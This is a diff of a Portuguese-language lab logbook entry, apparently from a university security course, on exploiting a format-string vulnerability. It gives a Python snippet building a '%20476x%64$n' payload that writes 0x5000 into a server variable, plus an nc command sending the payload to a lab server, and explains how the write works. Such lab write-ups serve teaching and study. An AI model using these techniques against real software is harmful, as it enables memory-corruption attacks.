@@ -120,40 +120,28 @@ Ao examinar o *output* do servidor, podemos reparar que o valor da variável *ta
 Para mudar o conteúdo para um valor específico de 0x5000, construímos o nosso script da mesma forma com algumas alterações. Criamos o seguinte script em Python para construir o nosso ficheiro, chamado badfile:
 
 ```python
-import sys
+tmp = (0x080e5068).to_bytes(4,byteorder='little') + ("%20476x%64$n").encode('latin-1')
 
-conteudo = (0x080e5068).to_bytes(4, byteorder='little') + ("%20476x%64$n").encode('latin-1')
-
-# Escrever o conteúdo em badfile
-with open('badfile', 'wb') as f:
-  f.write(conteudo)
+with open('task3b.txt', 'wb') as f:
+  f.write(tmp)
 ```
 
-Sabemos que 0x5000 é 20480 em decimal, mas não podemos simplesmente escrever 20480 bytes no ficheiro, pois sabemos da tarefa anterior que o servidor aceita no máximo 1500 bytes de nós.
+Sabemos que 0x5000 é 20480 em decimal, mas não podemos simplesmente escrever 20480 bytes no ficheiro, pois sabemos da tarefa anterior que o servidor aceita no máximo 1500 bytes de input.
 
 Primeiro, escrevemos os 4 bytes para o endereço.
 
 Depois, os restantes 20476 bytes serão preenchidos usando o especificador de formato %x com uma largura fixa. Com %[largura]x -> %20476x, o programa irá ler 20476 bytes e tentará imprimi-los.
 
-Por fim, o especificador %n irá impedi-lo de imprimir esses bytes, mas ainda os contará, então o valor armazenado no endereço será o valor que queremos.
-
+O `format specifier` `%n` irá então armazenar o número de bytes escritos, nest caso 20480, no endereço indicado.
+Assim, corremos o comando:
+```bash
+$ cat task3b.txt | nc 10.9.0.5 9090
 ```
-Starting server-10.9.0.5 ... done
-Starting server-10.9.0.6 ... done
-Attaching to server-10.9.0.5, server-10.9.0.6
-server-10.9.0.5 | Got a connection from 10.9.0.1
-server-10.9.0.5 | Starting format
-server-10.9.0.5 | The input buffer's address:    0xffffd720
-server-10.9.0.5 | The secret message's address:  0x080b4008
-server-10.9.0.5 | The target variable's address: 0x080e5068
-server-10.9.0.5 | Waiting for user input ......
-server-10.9.0.5 | Received 16 bytes.
-server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd648
-server-10.9.0.5 | The target variable's value (before): 0x11223344
-server-10.9.0.5 | (*)The target variable's value (after):  0x00005000
-server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)`
-```
+para passar o contéudo do ficheiro `task3b.txt` como input para o servidor.
 
-Depois de examinar a saída do servidor, podemos ver que o valor da variável alvo (após) foi alterado com sucesso para 0x00005000.
+Depois de examinar o *output* do servidor, podemos ver que o valor da variável alvo (*after*) foi alterado com sucesso para 0x00005000.
+<img src="./images/logbook7/log7t3_b1.png"><br>
+<img src="./images/logbook7/log7t3_b2.png"><br>
 
-(*) - Na saída do servidor, porque %n imprime espaços vazios, a saída imprimiu muitos espaços vazios. Isto foi removido para concisão.
+
+
